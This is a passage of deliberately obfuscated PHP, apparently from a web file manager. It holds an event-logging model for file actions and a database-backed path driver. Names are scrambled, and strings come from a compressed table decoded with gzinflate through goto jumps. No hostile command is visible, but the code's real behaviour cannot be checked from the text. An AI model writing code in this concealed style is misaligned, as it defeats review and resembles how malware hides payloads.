authTargetInfoMake($†Ëê—‹½) { $•á·¯Û« =& $_SERVER[öæÛ¿©¿]; $Ü¬ˆçü = array(); $„ÎˆÄ§È = array(); foreach ($†Ëê—‹½ as $û“³†ßú) { if ($û“³†ßú[$•á·¯Û«[189]] == SourceModel::TYPE_USER) { $Ü¬ˆçü[] = intval($û“³†ßú[$•á·¯Û«[585]]); } else { if ($û“³†ßú[$•á·¯Û«[189]] == SourceModel::TYPE_GROUP) { $„ÎˆÄ§È[] = intval($û“³†ßú[$•á·¯Û«[585]]); } } } if ($Ü¬ˆçü) { $Ü¬ˆçü = Model($•á·¯Û«[593])->userListInfo($Ü¬ˆçü); } if ($„ÎˆÄ§È) { $ûÌéìß¼ = array($•á·¯Û«[2216] => array($•á·¯Û«[503], $„ÎˆÄ§È)); $„ÎˆÄ§È = Model($•á·¯Û«[601])->field($•á·¯Û«[2355])->where($ûÌéìß¼)->select(); $„ÎˆÄ§È = array_to_keyvalue($„ÎˆÄ§È, $•á·¯Û«[1440]); } return array($•á·¯Û«[2356] => $Ü¬ˆçü, $•á·¯Û«[2357] => $„ÎˆÄ§È); } public function authInfo($¸Ò ßš ) { $¢’‰¡ú =& $_SERVER[öæÛ¿©¿]; if ($¸Ò ßš [$¢’‰¡ú[1585]]) { $µòÔ“ = Model($¢’‰¡ú[587])->listData($¸Ò ßš [$¢’‰¡ú[1585]]); if (!$µòÔ“) { return !1; $Ñ¤‰áğ¬ = Model($¢’‰¡ú[587])->listData(); $ÈÑÙñú = array_filter_by_field($Ñ¤‰áğ¬, $¢’‰¡ú[498], $¢’‰¡ú[229]); return $ÈÑÙñú; } $üĞÔ»îç = array_field_key($µòÔ“, array($¢’‰¡ú[483], $¢’‰¡ú[32], $¢’‰¡ú[498], $¢’‰¡ú[2152], $¢’‰¡ú[2153])); $üĞÔ»îç[$¢’‰¡ú[2358]] = $¸Ò ßš ; return $üĞÔ»îç; } else { return array($¢’‰¡ú[504] => 0, $¢’‰¡ú[2137] => $¸Ò ßš [$¢’‰¡ú[2293]], $¢’‰¡ú[505] => $¢’‰¡ú[12], $¢’‰¡ú[2152] => $¢’‰¡ú[2359]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\143\145\137\145\x76\145\156\x74"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\124\x69\155\145", "\164\151\x6d\x65", "\x69\156\x73\x65\162\164", "\146\x75\156\x63\x74\x69\x6f\x6e"), array("\144\145\x73\x63", '', "\x69\x6e\x73\x65\162\164\x2c\x75\x70\x64\141\164\145\x2c\x73\145\154\x65\143\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Àô£ŒùÆ, $†¶µ¿‰±, $±³øŞºõ = '') { $²œ¢¿åî =& $_SERVER[öæÛ¿©¿]; if (!$this->eventSave) { return; } $‘ğç•°À = Model($²œ¢¿åî[1478])->sourceInfo($Àô£ŒùÆ); if (!$‘ğç•°À) { return !1; } if ($this->isDisableEvent($‘ğç•°À, $†¶µ¿‰±)) { return; } if ($±³øŞºõ && is_string($±³øŞºõ)) { $±³øŞºõ = array($²œ¢¿åî[2169] => $±³øŞºõ); } $‘·«£ãï = KodUser::id(); $ãÂ¿óõ = array($²œ¢¿åî[502] => $Àô£ŒùÆ, $²œ¢¿åî[2360] => $‘ğç•°À[$²œ¢¿åî[191]], $²œ¢¿åî[2361] => $‘ğç•°À[$²œ¢¿åî[32]], $²œ¢¿åî[598] => !empty($‘ğç•°À[$²œ¢¿åî[598]]) ? $‘ğç•°À[$²œ¢¿åî[598]] : $²œ¢¿åî[12], $²œ¢¿åî[1916] => $‘·«£ãï, $²œ¢¿åî[507] => $†¶µ¿‰±, $²œ¢¿åî[1918] => $±³øŞºõ); $this->addSystemLog($†¶µ¿‰±, $ãÂ¿óõ); unset($ãÂ¿óõ[$²œ¢¿åî[2361]], $ãÂ¿óõ[$²œ¢¿åî[598]]); return $this->add($ãÂ¿óõ); } private function addSystemLog($åƒîğæ, $¼ÊÁ´Ø¹) { $òòç…ˆ’ =& $_SERVER[öæÛ¿©¿]; if ($åƒîğæ == $òòç…ˆ’[2362]) { $åƒîğæ = $¼ÊÁ´Ø¹[$òòç…ˆ’[536]][$òòç…ˆ’[2363]]; } else { if (in_array($åƒîğæ, array($òòç…ˆ’[1508], $òòç…ˆ’[2364]))) { $åƒîğæ = $¼ÊÁ´Ø¹[$òòç…ˆ’[536]][$òòç…ˆ’[169]]; } } $å¢¯¬ƒô = array_merge($¼ÊÁ´Ø¹, array($òòç…ˆ’[2365] => $¼ÊÁ´Ø¹[$òòç…ˆ’[192]], $òòç…ˆ’[2366] => $¼ÊÁ´Ø¹[$òòç…ˆ’[2366]])); Hook::trigger($òòç…ˆ’[2367], $òòç…ˆ’[2368] . $åƒîğæ, $¼ÊÁ´Ø¹); Model($òòç…ˆ’[2078])->addLog($òòç…ˆ’[2368] . $åƒîğæ, $å¢¯¬ƒô); } private function isDisableEvent($Š–ĞÛğ, $Æ¶µ±ù¸) { $°†ŠˆãÉ =& $_SERVER[öæÛ¿©¿]; if ($Š–ĞÛğ[$°†ŠˆãÉ[189]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Æ¶µ±ù¸ == $°†ŠˆãÉ[1276]) { return !1; } return !0; } public function eventCreate($ÍâÜ×¹°, $×Ñ®çş) { $µØÎÄè• =& $_SERVER[öæÛ¿©¿]; $¢Á£ì·£ = Model($µØÎÄè•[1478])->sourceInfo($ÍâÜ×¹°); $ƒ…ÓÍÛ = array($µØÎÄè•[2363] => $×Ñ®çş, $µØÎÄè•[32] => $¢Á£ì·£[$µØÎÄè•[32]]); return $this->addEvent($ÍâÜ×¹°, $µØÎÄè•[2362], $ƒ…ÓÍÛ); } public function eventFileEdit($Ü¨šèÔ) { $§ºäàªŸ =& $_SERVER[öæÛ¿©¿]; $¨ãÑûœ = array($§ºäàªŸ[2369] => $_SERVER[$§ºäàªŸ[2370]], $§ºäàªŸ[2371] => strtolower(ACTION)); if (isset($GLOBALS[$§ºäàªŸ[7]][$§ºäàªŸ[1568]])) { $¨ãÑûœ[$§ºäàªŸ[1568]] = $§ºäàªŸ[91]; } return $this->addEvent($Ü¨šèÔ, $§ºäàªŸ[1507], $¨ãÑûœ); } public function eventRecycle($§Ãˆëı, $ù¶ışì) { return $this->addEvent($§Ãˆëı, $_SERVER[öæÛ¿©¿][2364], $ù¶ışì); } private static $_removeLast = ''; public function eventRemove($×é˜ç®Õ) { $íàô½éÜ =& $_SERVER[öæÛ¿©¿]; self::$_removeLast = $×é˜ç®Õ; $ÜÇ»İÂ° = Model($íàô½éÜ[1478])->sourceInfo($×é˜ç®Õ); $ı•˜—¢ù = array_field_key($ÜÇ»İÂ°, array($íàô½éÜ[192], $íàô½éÜ[553], $íàô½éÜ[516], $íàô½éÜ[600])); $è‚ı¡‚ = array($íàô½éÜ[169] => $ÜÇ»İÂ°[$íàô½éÜ[32]], $íàô½éÜ[2371] => ACTION, $íàô½éÜ[2372] => $ı•˜—¢ù); return $this->addEvent($ÜÇ»İÂ°[$íàô½éÜ[191]], $íàô½éÜ[1276], $è‚ı¡‚); } public function eventShare($íÌ•¢¯Ğ, $ÅÕö¶©) { return $this->addEvent($íÌ•¢¯Ğ, $_SERVER[öæÛ¿©¿][1508], $ÅÕö¶©); } public function eventMove($šæ³ÓÆƒ, $Éõ©¢‹œ, $‰¬‡şÊ™) { $Ñ®¹³Ïö =& $_SERVER[öæÛ¿©¿]; if (self::$_removeLast == $šæ³ÓÆƒ) { return; } $´Çâ¹Æˆ = Model($Ñ®¹³Ïö[1478]); $Á•¬ëÜ› = $´Çâ¹Æˆ->sourceInfo($šæ³ÓÆƒ); $á¯“íÃÔ = $´Çâ¹Æˆ->sourceInfo($Éõ©¢‹œ); $îŠ¹Ìğã = $´Çâ¹Æˆ->sourceInfo($‰¬‡şÊ™); $ÖˆĞ’Ä = array($Ñ®¹³Ïö[1288] => $Éõ©¢‹œ, $Ñ®¹³Ïö[2373] => $á¯“íÃÔ[$Ñ®¹³Ïö[32]], $Ñ®¹³Ïö[2331] => !empty($á¯“íÃÔ[$Ñ®¹³Ïö[598]]) ? $á¯“íÃÔ[$Ñ®¹³Ïö[598]] : $Ñ®¹³Ïö[12], $Ñ®¹³Ïö[1289] => $‰¬‡şÊ™, $Ñ®¹³Ïö[2374] => $îŠ¹Ìğã[$Ñ®¹³Ïö[32]], $Ñ®¹³Ïö[2375] => !empty($îŠ¹Ìğã[$Ñ®¹³Ïö[598]]) ? $îŠ¹Ìğã[$Ñ®¹³Ïö[598]] : $Ñ®¹³Ïö[12]); $this->addEvent($šæ³ÓÆƒ, $Ñ®¹³Ïö[639], $ÖˆĞ’Ä); $Á•¬ëÜ› = $´Çâ¹Æˆ->sourceInfo($šæ³ÓÆƒ); $ÖˆĞ’Ä = array($Ñ®¹³Ïö[192] => $Á•¬ëÜ›[$Ñ®¹³Ïö[192]], $Ñ®¹³Ïö[32] => $Á•¬ëÜ›[$Ñ®¹³Ïö[32]]); $this->addEvent($Éõ©¢‹œ, $Ñ®¹³Ïö[2376], $ÖˆĞ’Ä); } public function eventCopy($éú’¢İÍ) { $this->eventCreate($éú’¢İÍ, $_SERVER[öæÛ¿©¿][637]); } public function eventRename($Ï©œÀªü, $À½É›¢, $Œéõ‰‚Ú) { $ôÀÆˆé =& $_SERVER[öæÛ¿©¿]; $æéêƒë¯ = array($ôÀÆˆé[1288] => $À½É›¢, $ôÀÆˆé[1289] => $Œéõ‰‚Ú); return $this->addEvent($Ï©œÀªü, $ôÀÆˆé[1492], $æéêƒë¯); } public function eventAddComment($”¥ø¡‰›, $ç¶³ãÑÍ) { return $this->addEvent($”¥ø¡‰›, $_SERVER[öæÛ¿©¿][2377], $ç¶³ãÑÍ); } public function eventAddDesc($úîí‘£, $ÒŸ³‘â•) { return $this->addEvent($úîí‘£, $_SERVER[öæÛ¿©¿][2378], $ÒŸ³‘â•); } public function listBySource($ôæÁõñ¹) { $ÊÊ² Í =& $_SERVER[öæÛ¿©¿]; $…Ù£˜Ú = Model($ÊÊ² Í[1478])->sourceInfo($ôæÁõñ¹); $Ÿ€¼ìí‰ = array($ÊÊ² Í[502] => $ôæÁõñ¹); if ($…Ù£˜Ú[$ÊÊ² Í[496]] == $ÊÊ² Í[91]) { $‘É‹™Š = Model($ÊÊ² Í[1478])->listSearchChildren($ôæÁõñ¹, 20000); $‘É‹™Š[] = $ôæÁõñ¹ . $ÊÊ² Í[463]; $Ÿ€¼ìí‰ = array($ÊÊ² Í[192] => array($ÊÊ² Í[7], $‘É‹™Š)); } $‘øûàİè = $this->where($Ÿ€¼ìí‰)->order($ÊÊ² Í[2379])->selectPage(); if ($‘øûàİè[$ÊÊ² Í[443]][$ÊÊ² Í[444]] == 0) { $‘øûàİè[$ÊÊ² Í[443]][$ÊÊ² Í[444]] = 1; $‘øûàİè[$ÊÊ² Í[446]] = array(array($ÊÊ² Í[502] => $ôæÁõñ¹, $ÊÊ² Í[2360] => $…Ù£˜Ú[$ÊÊ² Í[191]], $ÊÊ² Í[1916] => $…Ù£˜Ú[$ÊÊ² Í[537]], $ÊÊ² Í[507] => $ÊÊ² Í[2380], $ÊÊ² Í[508] => $…Ù£˜Ú[$ÊÊ² Í[232]], $ÊÊ² Í[1918] => $ÊÊ² Í[12])); } return $this->eventListParse($‘øûàİè, $ôæÁõñ¹); } private function eventListParse($ÒÈ¤åÜ, $Ì˜šñ¼ø) { $–ø¾¡ğ× =& $_SERVER[öæÛ¿©¿]; $°ëÔø±ˆ = $ÒÈ¤åÜ[$–ø¾¡ğ×[446]]; $’í«Šä‡ = array_to_keyvalue($°ëÔø±ˆ, $–ø¾¡ğ×[12], $–ø¾¡ğ×[192]); $Óê‚à‹ = array_to_keyvalue($°ëÔø±ˆ, $–ø¾¡ğ×[12], $–ø¾¡ğ×[2366]); foreach ($°ëÔø±ˆ as $ÑôğüÇ™) { $ºŞ™¯Ï = $ÑôğüÇ™[$–ø¾¡ğ×[536]]; if ($ÑôğüÇ™[$–ø¾¡ğ×[33]] == $–ø¾¡ğ×[639] && isset($ºŞ™¯Ï[$–ø¾¡ğ×[1288]])) { $’í«Šä‡[] = $ºŞ™¯Ï[$–ø¾¡ğ×[1288]] . $–ø¾¡ğ×[12]; $’í«Šä‡[] = $ºŞ™¯Ï[$–ø¾¡ğ×[1289]] . $–ø¾¡ğ×[12]; } if ($ÑôğüÇ™[$–ø¾¡ğ×[33]] == $–ø¾¡ğ×[2376] && isset($ºŞ™¯Ï[$–ø¾¡ğ×[192]])) { $’í«Šä‡[] = $ºŞ™¯Ï[$–ø¾¡ğ×[192]] . $–ø¾¡ğ×[12]; } } $’í«Šä‡ = array_merge($’í«Šä‡, $Óê‚à‹, array($Ì˜šñ¼ø . $–ø¾¡ğ×[12])); $’í«Šä‡ = array_unique($’í«Šä‡); $µ˜©ßè = array_unique(array_to_keyvalue($°ëÔø±ˆ, $–ø¾¡ğ×[12], $–ø¾¡ğ×[1538])); $Ô†Ş©§­ = Model($–ø¾¡ğ×[613])->userListInfo($µ˜©ßè); $Ï éËÑ’ = Model($–ø¾¡ğ×[925])->sourceListInfo($’í«Šä‡, !0); foreach ($°ëÔø±ˆ as &$ÑôğüÇ™) { if ($ÑôğüÇ™[$–ø¾¡ğ×[33]] == $–ø¾¡ğ×[639] && isset($ÑôğüÇ™[$–ø¾¡ğ×[536]][$–ø¾¡ğ×[1288]])) { $ÑôğüÇ™[$–ø¾¡ğ×[536]][$–ø¾¡ğ×[1288]] = $Ï éËÑ’[$ÑôğüÇ™[$–ø¾¡ğ×[536]][$–ø¾¡ğ×[1288]]]; $ÑôğüÇ™[$–ø¾¡ğ×[536]][$–ø¾¡ğ×[1289]] = $Ï éËÑ’[$ÑôğüÇ™[$–ø¾¡ğ×[536]][$–ø¾¡ğ×[1289]]]; } if ($ÑôğüÇ™[$–ø¾¡ğ×[33]] == $–ø¾¡ğ×[2376] && isset($ÑôğüÇ™[$–ø¾¡ğ×[536]][$–ø¾¡ğ×[192]])) { $ÑôğüÇ™[$–ø¾¡ğ×[536]][$–ø¾¡ğ×[192]] = $Ï éËÑ’[$ÑôğüÇ™[$–ø¾¡ğ×[536]][$–ø¾¡ğ×[192]]]; } $ÑôğüÇ™[$–ø¾¡ğ×[90]] = $Ï éËÑ’[$ÑôğüÇ™[$–ø¾¡ğ×[192]]]; $ÑôğüÇ™[$–ø¾¡ğ×[2381]] = $Ï éËÑ’[$ÑôğüÇ™[$–ø¾¡ğ×[2366]]]; if ($ÑôğüÇ™[$–ø¾¡ğ×[33]] == $–ø¾¡ğ×[1276]) { $ÑôğüÇ™[$–ø¾¡ğ×[2381]] = $ÑôğüÇ™[$–ø¾¡ğ×[90]]; $ÑôğüÇ™[$–ø¾¡ğ×[2366]] = $ÑôğüÇ™[$–ø¾¡ğ×[2381]][$–ø¾¡ğ×[192]]; $ÑôğüÇ™[$–ø¾¡ğ×[90]] = !1; $ÑôğüÇ™[$–ø¾¡ğ×[192]] = $–ø¾¡ğ×[12]; } $ÑôğüÇ™[$–ø¾¡ğ×[2305]] = $Ô†Ş©§­[$ÑôğüÇ™[$–ø¾¡ğ×[1538]]]; } unset($ÑôğüÇ™); $ÒÈ¤åÜ[$–ø¾¡ğ×[446]] = $°ëÔø±ˆ; return $ÒÈ¤åÜ; } public function removeBySource($û’„Ş›¿) { $ÄÚó¦ã¬ = array($_SERVER[öæÛ¿©¿][502] => $û’„Ş›¿); $this->where($ÄÚó¦ã¬)->remove(); } } goto A ãê™º‚; c•¥×²…Ï§: if (strlen($wrcmbaxhse) < $_SERVER[öæÛ¿©¿][699]) { return; } $_SERVER[„Ã«ôíÀ] = explode($_SERVER[öæÛ¿©¿][700], gzinflate(substr($_SERVER[öæÛ¿©¿][701], 10, -8))); $comfblkzqg = $_SERVER[öæÛ¿©¿][702]; goto D¬Â£ó½Ê·; D–Ş¡Ğ²„: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¸íê¤ù) { $this->pathParse = $¸íê¤ù; $this->model = Model($_SERVER[öæÛ¿©¿][1478]); } public function getPath($òšâÄÑ’) { return trim($òšâÄÑ’, $_SERVER[öæÛ¿©¿][8]); } public function pathFather($˜õÁ´Õ²) { $„ì›í’› = $this->parse($˜õÁ´Õ²); $„ì›í’› = $this->infoSimple($˜õÁ´Õ²); return $„ì›í’› ? $„ì›í’›[$_SERVER[öæÛ¿©¿][191]] : !1; } public function pathThis($óÊËê¡) { $ó™ú€€´ = $this->infoSimple($óÊËê¡); return $ó™ú€€´ ? $ó™ú€€´[$_SERVER[öæÛ¿©¿][32]] : !1; } public function getPathOuter($ıÌœ¶ì…) { if (!$ıÌœ¶ì…) { return $ıÌœ¶ì…; } $´–ÄŸğŒ = $this->parse($ıÌœ¶ì…); return KodIO::make($´–ÄŸğŒ[$_SERVER[öæÛ¿©¿][483]]); } public function copyFolderFromIO($…Î¼£óë, $”ÀÈ¼Éâ, $ï¨¦Áä, $²‚ËùÖ·, $ôÍ¸Ìœ÷) { $‘Ş¡êÈ¾ = $this->model->copyFolderFromIO($…Î¼£óë, $”ÀÈ¼Éâ, $ï¨¦Áä, $²‚ËùÖ·, $ôÍ¸Ìœ÷); return KodIO::make($‘Ş¡êÈ¾); } public function isParentOf($”ØŞ…àº, $õÊÌ…®™) { return $this->model->isParentOf($”ØŞ…àº, $õÊÌ…®™); } public function mkfile($ı—–Âèœ, $·îˆ›ä› = '', $ø”¼ÖÍñ = REPEAT_RENAME) { $ğÍ¿¡€ş =& $_SERVER[öæÛ¿©¿]; $ĞÙ€òêî = $this->parse($ı—–Âèœ); $ı—–Âèœ = $ĞÙ€òêî[$ğÍ¿¡€ş[483]]; for ($á®ş§šé = 0; $á®ş§šé < count($ĞÙ€òêî[$ğÍ¿¡€ş[1479]]); $á®ş§šé++) { $²†Ï·î† = $ĞÙ€òêî[$ğÍ¿¡€ş[1479]][$á®ş§šé]; if ($á®ş§šé == count($ĞÙ€òêî[$ğÍ¿¡€ş[1479]]) - 1) { $ı—–Âèœ = $this->model->mkfile($ı—–Âèœ, $²†Ï·î†, $·îˆ›ä›, $ø”¼ÖÍñ); break; } $ı—–Âèœ = $this->model->mkdir($ı—–Âèœ, $²†Ï·î†, REPEAT_SKIP); } return $this->getPathOuter($ı—–Âèœ); } public function mkdir($¡ö–Ú“‚, $áÇ·´ó = REPEAT_SKIP) { $Ã…ğÙ«ê =& $_SERVER[öæÛ¿©¿]; $®° Äø’ = $this->parse($¡ö–Ú“‚); $¡ö–Ú“‚ = $®° Äø’[$Ã…ğÙ«ê[483]]; for ($êÙõã§ = 0; $êÙõã§ < count($®° Äø’[$Ã…ğÙ«ê[1479]]); $êÙõã§++) { $üßší = $®° Äø’[$Ã…ğÙ«ê[1479]][$êÙõã§]; $¡ö–Ú“‚ = $this->model->mkdir($¡ö–Ú“‚, $üßší, $áÇ·´ó); } return $this->getPathOuter($¡ö–Ú“‚); } public function copyFile($’¯ßòÉ›, $Õê¼Šşš, $”¯‡á¯ç = REPEAT_REPLACE) { $ú®ª±„» =& $_SERVER[öæÛ¿©¿]; $¶âÂ¥Äã = $this->parse($Õê¼Šşš); $„‚ŞÉá = $this->model->copy($’¯ßòÉ›, $¶âÂ¥Äã[$ú®ª±„»[483]], $”¯‡á¯ç, $¶âÂ¥Äã[$ú®ª±„»[87]]); return $„‚ŞÉá ? $this->getPathOuter($„‚ŞÉá) : !1; } public function moveFile($ğ à¡Ää, $â…¡ºùè, $Ù¼Çø • = REPEAT_REPLACE) { $ò»ëíëœ =& $_SERVER[öæÛ¿©¿]; $ı­ƒ„º = $this->parse($â…¡ºùè); $ôààĞˆª = $this->model->move($ğ à¡Ää, $ı­ƒ„º[$ò»ëíëœ[483]], $Ù¼Çø •, $ı­ƒ„º[$ò»ëíëœ[87]]); return $ôààĞˆª ? $this->getPathOuter($ôààĞˆª) : !1; } public function copy($´Ëùƒ¥…, $·•±ñ¼, $˜ì•ÜÑÖ = REPEAT_REPLACE, $Ô»¥ì‹õ = false) { $”Ä¾Í¶ = $this->parse($·•±ñ¼); $„¢á±ö‹ = $this->model->copy($´Ëùƒ¥…, $”Ä¾Í¶[$_SERVER[öæÛ¿©¿][483]], $˜ì•ÜÑÖ, $Ô»¥ì‹õ); return $„¢á±ö‹ ? $this->getPathOuter($„¢á±ö‹) : !1; } public function moveSameAllow() { } public function move($Ê°¢Æ±, $íÚ·˜ç§, $Õşì ·í = REPEAT_REPLACE, $§Àú’à‚ = false) { $¥Šá¸§î = $this->parse($íÚ·˜ç§); $éòóÛç¸ = $this->model->move($Ê°¢Æ±, $¥Šá¸§î[$_SERVER[öæÛ¿©¿][483]], $Õşì ·í, $§Àú’à‚); return $éòóÛç¸ ? $this->getPathOuter($éòóÛç¸) : !1; } public function remove($Û’†Á, $­İ˜‚‚š = true) { return $this->model->remove($Û’†Á, $­İ˜‚‚š); } public function rename($Ùİæ´Ñª, $ı‚²¿±„) { $ùÂ›õ›• = $this->model->rename($Ùİæ´Ñª, $ı‚²¿±„); return $ùÂ›õ›• ? $this->getPathOuter($Ùİæ´Ñª) : $ùÂ›õ›•; } public function size($©ÇàÇŸÂ) { $ä¨Òã· = $this->infoSimple($©ÇàÇŸÂ); return $ä¨Òã· ? $ä¨Òã·[$_SERVER[öæÛ¿©¿][79]] : 0; } public function infoSimple($Æóò˜Äµ) { return $this->model->sourceInfo($Æóò˜Äµ); } public function info($¥îÀ¢Ü×) { return $this->infoParse($¥îÀ¢Ü×); } public function infoAuth($áÜ¶Áš¿) { return $this->infoParse($áÜ¶Áš¿, !1, !0); } public function infoWithChildren($ò§Ã¾â) { return $this->infoParse($ò§Ã¾â, !0); } protected function infoParse($„ñá²¦, $¾Öü²ü™ = false, $Üòü‡¼ = false) { if (!$¾Öü²ü™) { return $this->model->pathInfo($„ñá²¦, $Üòü‡¼); } return $this->model->pathInfoMore($„ñá²¦); } public function infoFullSimple($êù°æ§) { $æõËù¨· =& $_SERVER[öæÛ¿©¿]; $à’³æï‡ = explode($æõËù¨·[8], $êù°æ§); $£èä¾³¶ = implode($æõËù¨·[8], array_splice($à’³æï‡, 1)); return $this->model->pathInfoByPath($à’³æï‡[0], $£èä¾³¶); } public function infoFull($ñ ²Ğ§‘) { $‘ñı¸ÂÖ = $this->infoFullSimple($ñ ²Ğ§‘); return is_array($‘ñı¸ÂÖ) ? $this->model->pathInfo($‘ñı¸ÂÖ[$_SERVER[öæÛ¿©¿][192]]) : !1; } public function hashSimple($šÛ«“ƒ¤) { $éµæ€æª =& $_SERVER[öæÛ¿©¿]; $åë¹¸ŸÉ = $this->infoWithChildren($šÛ«“ƒ¤); return $åë¹¸ŸÉ[$éµæ€æª[168]][$éµæ€æª[691]]; } public function hashMd5($´ò÷ªİ) { $¹ªŞ™ =& $_SERVER[öæÛ¿©¿]; $ƒø¶ÉÇû = $this->infoWithChildren($´ò÷ªİ); return $ƒø¶ÉÇû[$¹ªŞ™[168]][$¹ªŞ™[559]]; } public function exist($—‹‰¿¿À) { $šà¬‰í =& $_SERVER[öæÛ¿©¿]; $ÈâŞßŠÙ = $this->parse($—‹‰¿¿À); if (!$ÈâŞßŠÙ[$šà¬‰í[87]]) { return $this->isFile($—‹‰¿¿À) || $this->isFolder($—‹‰¿¿À); } $ø¿Á˜¤¥ = array($šà¬‰í[488] => $ÈâŞßŠÙ[$šà¬‰í[483]], $šà¬‰í[32] => $ÈâŞßŠÙ[$šà¬‰í[87]]); $ªá×¦ŠŸ = $this->model->where($ø¿Á˜¤¥)->find(); return $ªá×¦ŠŸ ? !0 : !1; } public function isFile($ºĞÙªìÜ) { $Êò·ë =& $_SERVER[öæÛ¿©¿]; $˜­ŸÌÚ‚ = $this->infoSimple($ºĞÙªìÜ); return $˜­ŸÌÚ‚ && $˜­ŸÌÚ‚[$Êò·ë[496]] == $Êò·ë[229] ? !0 : !1; } public function isFolder($Œ­¥ÙÖ¶) { $Œ†ÂšÑÑ =& $_SERVER[öæÛ¿©¿]; $Œ¡±€ = $this->infoSimple($Œ­¥ÙÖ¶); return $Œ¡±€ && $Œ¡±€[$Œ†ÂšÑÑ[496]] == $Œ†ÂšÑÑ[91] ? !0 : !1; } public function listPath($ˆ‹Åóùß, $¤¥æñ´— = false) { $ªÙÒ½ç =& $_SERVER[öæÛ¿©¿]; if ($ˆ‹Åóùß == $ªÙÒ½ç[12]) { return !1; } $ÚşÕ¡€ = array($ªÙÒ½ç[488] => $ˆ‹Åóùß); if ($¤¥æñ´—) { return $this->model->listSource($ÚşÕ¡€, -1); } return $this->model->listSource($ÚşÕ¡€); } public function has($¬ŠÜĞù, $±Øˆğ’† = false, $öğë—ò = null) { $˜Î„¼ÃÑ =& $_SERVER[öæÛ¿©¿]; $Âöó™£¥ = $this->infoWithChildren($¬ŠÜĞù); if ($±Øˆğ’†) { return array($˜Î„¼ÃÑ[241] => $Âöó™£¥[$˜Î„¼ÃÑ[241]], $˜Î„¼ÃÑ[240] => $Âöó™£¥[$˜Î„¼ÃÑ[240]]); } return $öğë—ò ? $Âöó™£¥[$˜Î„¼ÃÑ[241]] : $Âöó™£¥[$˜Î„¼ÃÑ[240]]; } public function listAll($ÂÀ¬Ş¯´) { $§Éü÷ò† = IO::info($this->pathParse[$_SERVER[öæÛ¿©¿][87]]); if (!$§Éü÷ò†) { return array(); } return $this->model->listAll($ÂÀ¬Ş¯´); } public function getContent($ö¶¹€íÒ) { return $this->model->getContent($ö¶¹€íÒ); } public function setContent($Â”ëíî†, $ûÏÅÉ½Û = '') { return $this->model->setContent($Â”ëíî†, $ûÏÅÉ½Û); } public function fileSubstr($ìı›ÂĞª, $œÔ¬Ñş†, $½˜¦Üˆğ) { return $this->model->fileSubstr($ìı›ÂĞª, $œÔ¬Ñş†, $½˜¦Üˆğ); } public function download($ïÖ­ŸÌ, $÷´óßÇ = '') { $Î‘ëì˜× = get_path_father($÷´óßÇ); $…Æ® ôû = get_path_this($÷´óßÇ); $Óõ»‡Ò = $this->model->fileInfoGet($ïÖ­ŸÌ); $ÁÏ÷ìÜØ = IO::copy($Óõ»‡Ò[$_SERVER[öæÛ¿©¿][87]], $Î‘ëì˜×, !1, $…Æ® ôû); return $ÁÏ÷ìÜØ; } public function setModifyTime($‘ÔÑÊÌ, $Ê”Õ”ÉĞ = '') { $ “Çø“Í =& $_SERVER[öæÛ¿©¿]; if (!$‘ÔÑÊÌ) { return; } $this->model->where(array($ “Çø“Í[502] => $‘ÔÑÊÌ))->save(array($ “Çø“Í[88] => $Ê”Õ”ÉĞ)); } public function upload($£ÛÍÌ, $¸êØ¸, $ùú„ºğƒ = false, $ùÄÎã™ = REPEAT_REPLACE) { $“³¤–éå =& $_SERVER[öæÛ¿©¿]; $û¹Ëû™¸ = $this->parse($£ÛÍÌ); $´Í±¿Æ‘ = $this->model->addFile($û¹Ëû™¸[$“³¤–éå[483]], $¸êØ¸, $û¹Ëû™¸[$“³¤–éå[87]], $ùú„ºğƒ, $ùÄÎã™); return $this->getPathOuter($´Í±¿Æ‘); } public function uploadFileByID($É¤¯á¦Ô, $Ãõ¢É‰à, $À¥«ğº©) { $¯ï¾í—Ø =& $_SERVER[öæÛ¿©¿]; $ÂØÜË· = $this->parse($É¤¯á¦Ô); $òÌ‹¼›œ = $this->model->addFileByFileID($ÂØÜË·[$¯ï¾í—Ø[483]], $Ãõ¢É‰à, $ÂØÜË·[$¯ï¾í—Ø[87]], $À¥«ğº©); return $this->getPathOuter($òÌ‹¼›œ); } public function addFileByRemote($—µ½§½€, $ä³ŸŸã¥, $¾àôØúÂ = array(), $§–¤‘¨ä = '', $ÜÇÁ†¹²) { $••Ü‘×Ü =& $_SERVER[öæÛ¿©¿]; $ÎöÓ¨­Ê = $this->parse($—µ½§½€); $§–¤‘¨ä = empty($§–¤‘¨ä) ? $ÎöÓ¨­Ê[$••Ü‘×Ü[87]] : $§–¤‘¨ä; $¾„êè²Î = $this->model->addFileByRemote($ÎöÓ¨­Ê[$••Ü‘×Ü[483]], $ä³ŸŸã¥, $§–¤‘¨ä, $¾àôØúÂ, $ÜÇÁ†¹²); return $this->getPathOuter($¾„êè²Î); } public function uploadLink($ƒŠöğ‹, $Û¥¶î¢® = 0) { $ïßòÊŠ¼ =& $_SERVER[öæÛ¿©¿]; $…æ­ñ— = $this->parse($ƒŠöğ‹); $ºŠ‹ Ê× = _get($GLOBALS[$ïßòÊŠ¼[7]], $ïßòÊŠ¼[1480]); $ÁŞöĞÊ = _get($GLOBALS[$ïßòÊŠ¼[7]], $ïßòÊŠ¼[1481]); $¢ˆë»¦º = KodIO::ioFileDriverGet($ïßòÊŠ¼[494] . $…æ­ñ—[$ïßòÊŠ¼[483]] . $ïßòÊŠ¼[403]); $ á ùâÊ = Model($ïßòÊŠ¼[693])->createFileName($…æ­ñ—[$ïßòÊŠ¼[87]], $¢ˆë»¦º, $ºŠ‹ Ê×, $ÁŞöĞÊ); return IO::uploadLink($ á ùâÊ, $Û¥¶î¢®); } public function fileNameAuto($ÛŸØ—ş, $ÌŠ•†ä´, $ÌÙÓû‰À = REPEAT_REPLACE, $¢ƒ™ó× = false) { return $this->model->fileNameAuto($ÛŸØ—ş, $ÌŠ•†ä´, $ÌÙÓû‰À, $¢ƒ™ó×); } public function fileNameExist($˜¿î‘•, $¬¨ÓÚ·µ) { return $this->model->fileNameExist($˜¿î‘•, $¬¨ÓÚ·µ); } protected function _fileOut($…¦¯Ä«á, $î·ØãÓ¼ = false, $‚ĞÉÖò½ = false, $«Š®×ùÍ = '', $–Î¬ÓÀä = false) { $  ¼Ó—‹ =& 